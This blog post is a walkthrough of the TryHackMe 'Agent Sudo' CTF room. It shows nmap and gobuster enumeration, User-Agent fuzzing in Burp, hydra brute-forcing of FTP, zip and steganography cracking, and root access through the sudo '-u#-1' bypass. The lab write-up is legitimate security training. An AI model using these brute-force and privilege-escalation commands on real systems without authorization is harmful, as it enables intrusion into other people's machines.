---
layout: post
permalink: /posts/thm/agent-sudo
title: "Agent Sudo"
---

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun! <br/>

Our enumeration process will start with our favourite tool nmap.

```
nmap -sC -sV <IP>
```

![nmap](/assets/images/thm/agent-sudo/nmap.png)

nmap result shows us that there is port 21 FTP, port 22 SSH and port 80 HTTP opened. Visit the website.

![website](/assets/images/thm/agent-sudo/website.png)

It looks we have to find a `codename`. Let's scan for hidden directories.

```
gobuster dir -u http://10.10.34.21/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
```

While we are waiting for the gobuster scan I tried to get in FTP with anonymous login but it wasn't successful.

![ftp-anonymous](/assets/images/thm/agent-sudo/ftp-anonymous.png)

Gobuster scan finished.

![gobuster](/assets/images/thm/agent-sudo/gobuster.png)

I tried with other wordlist but I wasn't able to find anything. It took me some time until I find a way to continue. This `user-agent` looked suspicious for me so I just googled it. I found out that the user-agent is HTTP header used to identify application and opertaion system. After some aditional research I found that we can change this user-agent. The tool that can help us is Burp Suite. We also need `codename`, actually Agent R probably should be a codename. Ctach the request with Burp and change the User-Agent.

![user-agent-r](/assets/images/thm/agent-sudo/user-agent-r.png)
 
Once we have changed the user-agent we can forward the request.

![website-r](/assets/images/thm/agent-sudo/website-r.png)
 
The other agents codename shoul be a letter too. Let's try payload attack with Burp. Send the request to Intruder, go to the position tab and set the position where payloads will be inserted by copy the desired place(in our case this is user-agent) and click add button

![payload-position](/assets/images/thm/agent-sudo/payload-position.png)

Now go to the payload tab and insert all letters.

![payloads](/assets/images/thm/agent-sudo/payloads.png)

Good. Let's start the attack.

![attack-result](/assets/images/thm/agent-sudo/attack-result.png)

We can notice that user-agent `R` and `C` has different length from the others. Try to change the user-agent with C.

![user-agent-c](/assets/images/thm/agent-sudo/user-agent-c.png)

this forwards us to the hidden site

![c-attention](/assets/images/thm/agent-sudo/c-attention.png)

![chris](/assets/images/thm/agent-sudo/chris.png)

I have finally found the agent name. Go and try to bruteforce the FTP server. 

```
hydra -l chris -P rockyou.txt 10.10.34.21 ftp
```

![hydra](/assets/images/thm/agent-sudo/hydra.png)

Log into the FTP server

```
ftp <ip>
```

![ftp](/assets/images/thm/agent-sudo/ftp.png)

You can use `get <FILE_NAME>` to download the files.

![txt](/assets/images/thm/agent-sudo/txt.png)

I know only one tool for image steganography, it's `exiftool`. Unfortunately this didn't help me. I searched for image steganography tools and found top 3 tool steghide, exiftool and binwalk. I have already tried exiftool so we will go and tried the others. Using steghide requered me a password.

![steghide-password](/assets/images/thm/agent-sudo/steghide-password.png)

So finger crossed for binwalk

```
binwalk cutie.png -e
```

![binwalk](/assets/images/thm/agent-sudo/binwalk.png)

To crack the zip password we are going to use John the Ripper. It has a perfect python script which will generate a hash and we are going to crack it after that.

```
zip2john 8702.zip > hash.txt
```

now use john to crack it

```
sudo john hash.txt
```

![john](/assets/images/thm/agent-sudo/john.png)

Let's extract the zip file

```
7z e 8702.zip
```

![7z](/assets/images/thm/agent-sudo/7z.png)

read the file

![7z-txt](/assets/images/thm/agent-sudo/7z-txt.png)

It looks like base64. Use `https://gchq.github.io/CyberChef/` or the following command `echo "QXJlYTUx" | base64 --decode` <br/>

Let's try again steghide

```
steghide extract -sf cute-alien.jpg
```

![steghide](/assets/images/thm/agent-sudo/steghide.png)

![message](/assets/images/thm/agent-sudo/message.png)

SSH with james

```
ssh james@10.10.34.21
```

![james-ssh](/assets/images/thm/agent-sudo/james-ssh.png)

We have found the first flag but we also need to open the jpg file. You can downloads files through SSH with the following command

```
scp <USER_NAME>@<IP>:<FILE_NAME> <DESIRED_LOCATION_ON_YOUR_MACHINE>
```

![ssh-download](/assets/images/thm/agent-sudo/ssh-download.png)

Now we need to use reverse image to answer the next question. Use google search image and filter for foxnews site.

![google](/assets/images/thm/agent-sudo/google.png)

The last thing that we have to do is to escalate our privilege. I always first try with the command `sudo -l` to view whether we are able to execute any commands with sudo permissions.

![sudo-l](/assets/images/thm/agent-sudo/sudo-l.png)

Wow, our user is able to run `/bin/bash` as any user excluding as root. We are going to use our best friend google. My search probably looks crazy but it worked.

![google-cve](/assets/images/thm/agent-sudo/google-cve.png)

Read through the report `https://www.exploit-db.com/exploits/47502` and escalate our privilege

```
sudo -u#-1 /bin/bash
```

![root](/assets/images/thm/agent-sudo/root.png)

Find the flag and answer the last question.

![final](/assets/images/thm/agent-sudo/final.png)

Woohoo... we were able to pass this room. Actually it was very tough for me but I learnt a lot from that challenge. 
